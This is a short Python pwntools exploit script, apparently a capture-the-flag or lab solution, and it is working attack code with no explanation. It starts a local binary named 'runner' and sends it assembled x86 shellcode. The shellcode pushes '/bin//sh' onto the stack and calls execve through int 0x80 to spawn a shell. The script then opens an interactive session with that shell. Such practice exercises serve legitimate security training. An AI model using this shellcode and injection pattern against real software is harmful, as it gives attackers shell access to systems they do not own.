#!/usr/bin/env python3

from pwn import *

p = process("./runner")

# Our shellcode
payload = asm("""
    mov     eax, 0x0        # eax = 0000
    push    eax             # push null bytes for string termination
    push    0x68732f2f      # push substring '//sh'
    push    0x6e69622f      # push substring '/bin'
    mov     ebx, esp        # path points to the string /bin//sh0000
    push    eax             # push 32-bit null terminator for argv & envp
    mov     edx, esp        # envp points to 32-bit null terminator
    push    ebx             # push string address below null terminator
    mov     ecx, esp        # argv points to string address above
    mov     eax, 0xb        # execve
    int     0x80            # syscall interrupt
""")

p.sendline(payload)

p.interactive()
p.close()